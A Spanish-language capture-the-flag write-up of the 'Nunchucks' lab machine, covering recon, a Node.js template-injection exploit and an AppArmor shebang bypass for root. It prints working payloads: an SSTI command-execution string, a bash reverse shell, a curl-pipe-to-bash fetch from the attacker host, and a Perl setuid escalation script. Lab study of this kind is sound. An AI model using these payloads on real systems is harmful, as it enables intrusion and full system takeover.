------
- Tags: #SSTI #AppArmor #SELinux
------
# Resolución

----
> En esta máquina se abusa de un SSTI a través de un panel de Login que refleja el output colocado por el usuario, de esta forma se gana acceso a la máquina.
> En la escalada de privilegios se abusa de una vulnerabilidad que se acontece dentro del sistema de seguridad AppArmor que permite la ejecución de un archivo con capability abusando de la utilización de un shebang.
----
## Reconocimiento

### OS

**LINUX**
```bash
ping -c 1 10.10.11.122
PING 10.10.11.122 (10.10.11.122) 56(84) bytes of data.
64 bytes from 10.10.11.122: icmp_seq=1 ttl=63 time=281 ms

--- 10.10.11.122 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 280.692/280.692/280.692/0.000 ms
```

### NMAP

**Puertos**
```ruby
# Nmap 7.94SVN scan initiated Thu Dec 26 18:45:19 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN allPorts 10.10.11.122
Nmap scan report for 10.10.11.122
Host is up, received user-set (0.28s latency).
Scanned at 2024-12-26 18:45:19 -03 for 15s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Dec 26 18:45:34 2024 -- 1 IP address (1 host up) scanned in 14.89 seconds
```

**Servicios**
```ruby
# Nmap 7.94SVN scan initiated Thu Dec 26 18:47:12 2024 as: nmap -sCV -p22,80,443 -oN services 10.10.11.122
Nmap scan report for 10.10.11.122
Host is up (0.28s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Nunchucks - Landing Page
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 26 18:47:41 2024 -- 1 IP address (1 host up) scanned in 28.57 seconds
```

### Virtual Hosting

``10.10.11.122 ---> https://nunchucks.htb/``
### Whatweb

```ruby
whatweb https://nunchucks.htb/
https://nunchucks.htb/ [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], Email[support@nunchucks.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], JQuery, Script, Title[Nunchucks - Landing Page], X-Powered-By[Express], nginx[1.18.0]
```

### WFUZZ

```bash
wfuzz --hh=30587 -c -t 20 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.nunchucks.htb" -u https://nunchucks.htb/

store.nunchucks.htb
```

Agregamos al *``/etc/hosts``* el nuevo subdominio encontrado **``store.nunchucks.htb``**.
## Explotación

Se detectó que el **output** que coloco en el campo email se ve **reflejado**, por lo tanto se verificó la vulnerabilidad **SSTI** colocando ``{{4*4}}@hotmail.com`` para realizar una operatoria a modo de chequeo.

![[N 1.png]]

De esta forma comprobamos la vulnerabilidad. Ahora buscamos por *NodeJS SSTI* y encontramos la siguiente información en **HackTrickz**.

![[N 2.png]]

De esta forma verificamos el primer **Payload** a través de **Burpsuite** ya que hay un bloqueo en la web que nos detecta que no es un email el que estamos colocando.

- ``{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}@hotmail.com``

Cable aclarar que al colocar el Payload anterior en el Burpsuite se necesitan escapar (**``/``**) las comillas dobles quedando tal que así.

- *``{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}@hotmail.com``*

![[N 3.png]]

De esta forma tendríamos un **SSTI**, de esta forma tendremos **RCE** por lo tanto podríamos colocar el comando que quisieramos.

Por lo tanto ahora me entablo una **Reverse Shell** creando un archivo *index.html* en mi máquina de atacante con el siguiente contenido.

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.20/443 0>&1
```

Ahora montamos un servidor con *``python3 -m http.server 80``*

Luego desde el RCE que encontramos procedemos a realizar un *``{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl http://10.10.14.20/index.html | bash')\")()}}@hotmail.com``* el *``| bash``* ejecutará el archivo malicioso *index.html* con **bash** por lo tanto si nosotros nos encontramos en escucha por el *puerto 443* ganaremos acceso a la máquina.

## Escalada de Privilegios

Una vez ganamos acceso a la máquina reclamamos la flag del usuario y procedemos con la escalada hacia el usuario **root**.

----

Se detectó la capability *``setcapuid-ep``* en el binario */usr/bin/perl*, por lo tanto gracias a **GTFObins** encontramos una forma de explotar dicha capability.

Una vez intentamos realizar lo que nos indica el foro tal que así.

- **``./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'``**

Veremos que no funciona, pero si en vez de colocar *``/bin/sh``* colocamos **``whoami``** veremos que nos indica que somos **root**, por lo tanto hay algo que *nos está bloqueando el acceso a una consola interactiva* como usuario privilegiado. Cabe destacar que tampoco podremos listar la flag dentro del directorio *``/root``*, por lo tanto esto nos da a pensar que hay **una configuración extra colocada en el binario** para seleccionar que cosas se pueden realizar y que cosas no.

-----

Investigando descubrimos que existen ciertas restricciones que pueden estar configuradas en el sistema para evitar que accedamos a determinados recursos, esto se realiza a través de unas herramientas llamadas **SELinux** y **AppArmor**.

SELinux y AppArmor son sistemas de seguridad en Linux que implementan **control de acceso obligatorio (MAC)**, es decir, restricciones más estrictas que las que ofrece el control de acceso discrecional (DAC) tradicional de Linux basado en permisos de archivos y usuarios.

- En el caso de **SELinux** su propósito es aplicar políticas de seguridad estrictas al sistema, incluso si un atacante explota una vulnerabilidad. Utiliza etiquetas y políticas predefinidas para controlar qué procesos pueden interactuar con archivos, dispositivos y otros recursos.

- En el caso de **AppArmor** es otra herramienta de seguridad que también implementa control de acceso obligatorio. Sin embargo, a diferencia de *SELinux*, es más sencillo de configurar porque utiliza perfiles basados en rutas en lugar de etiquetas.

**Un ejemplo práctico:** Puedes crear un perfil para un binario como `perl` que permita ejecutar sólo comandos específicos y acceda únicamente a ciertas carpetas.

| **Característica**     | **SELinux**                  | **AppArmor**                |
|------------------------|-------------------------------|------------------------------|
| **Modelo**            | Basado en etiquetas          | Basado en rutas             |
| **Facilidad de uso**  | Más complejo de configurar    | Más sencillo de configurar  |
| **Flexibilidad**      | Muy detallado                | Menos detallado             |
| **Compatibilidad**    | Predeterminado en Fedora, RHEL, CentOS | Predeterminado en Ubuntu, Debian |

---

Por lo tanto buscaremos con ``find`` dentro de la máquina víctima algún indicio de estos dos sistemas de **seguridad**.

- **``find / -name \*apparmor\* 2>/dev/null | grep -vE "proc|var"``**

Con esto veremos varios resultados válidos, por lo tanto ya sabemos que va por este lado el problema.
Investigando por internet descubrimos que la ruta donde se encuentran los archivos de configuración es **``/etc/apparmor.d``** por lo tanto ingresamos ahí.

![[N 4.png]]

Si observamos dicho archivo veremos una configuración aplicada a determinados comandos o binarios que podemos acceder y otros a los que no.

![[N 5.png]]

Vemos que hay un archivo en la ruta *``/opt/backup.pl``* que tenemos permitido el acceso por lo tanto le haremos un *``cat``* para ver su contenido.

![[N 6.png]]

Como podemos ver hay varias líneas que **son muy similares al comando que utilizamos previamente** para abusar de la capability de **perl** y ejecutar el **``whoami``**.

Revisando los permisos de dicho archivo, veremos que nosotros solamente podemos ejecutar y leer el contenido de **``backup.pl``**, por lo tanto la duda radica en..

![[N 7.png]]

¿Qué es lo que tiene este script que me permite ejecutar un binario de **root** con perl aplicando el **``setuid``**?

La respuesta está en el **SHEBANG** (*``#!``*), ya que si nosotros ejecutamos un comando con **``perl``** de forma directa tal como lo hacíamos antes **a través de un oneliner no nos lo permitirá**, pero hay un Bug en *AppArmor* que si nosotros ejecutamos un archivo script en *perl* utilizando su **SHEBANG** no se aplicará el bloqueo tal que así **``./script.pl``**.

Por lo tanto crearemos un script llamado **``privesc.pl``** y le agregaremos el mismo código que usábamos previamente pero acomodando todo en diferentes líneas que son las que se encargan de cambiar el **ID** del usuario aprovechándose de la capability *``setuid+ep``*.

- **``./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'``** ---> Comando utilizado previamente

**``privesc.pl``**
```perl
#!/usr/bin/perl
use POSIX qw(setuid); 
POSIX::setuid(0);
exec "/bin/sh";
```

Luego le damos permiso de ejecución con **``chmod +x privesc.pl``**

Ahora simplemente en vez de ejecutarlo como ``perl privesc.pl`` lo haremos tal que así **``./privesc.pl``** de esta forma se tomará el **SHEBANG** como interprete y abusaríamos de la vulnerabilidad de AppArmor que no bloquea la ejecución de scripts con el empleo de **SHEBANGS**.

![[N 8.png]]

De esta forma ganaríamos acceso total a la máquina **``Nunchucks``**.